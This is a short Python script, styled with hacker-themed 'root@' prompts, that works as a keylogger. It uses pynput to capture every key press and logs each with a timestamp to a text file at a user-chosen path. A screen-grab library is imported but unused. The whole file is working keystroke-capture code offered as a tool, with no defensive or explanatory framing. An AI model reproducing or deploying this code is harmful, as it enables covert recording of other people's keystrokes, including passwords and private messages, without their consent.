from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import logging
from colorama import Fore
import os

def log():
    log_name = input(f"""
╔═══[root@{Fore.LIGHTRED_EX}TXT_NAME{Fore.RESET}]~$
╚══> """)
    log_dir = input(f"""
╔═══[root@{Fore.LIGHTRED_EX}FILE_PATH{Fore.RESET}]~$
╚══> """) + f"\\{log_name}.txt"

    print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.WHITE}Start{Fore.RESET} {Fore.LIGHTRED_EX}>{Fore.RESET} {log_dir}")

    logging.basicConfig(filename=log_dir, level=logging.DEBUG, format='%(asctime)s - %(message)s')

    key_logs = []

    def on_press(key):
        try:
            key_str = str(key).replace("'", "")
            key_logs.append(key_str + " ")
            logging.info(key_str)
        except Exception as e:
            print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.RED}ERROR : {Fore.RESET}{e}")

    with Listener(on_press=on_press) as listener:
        listener.join()
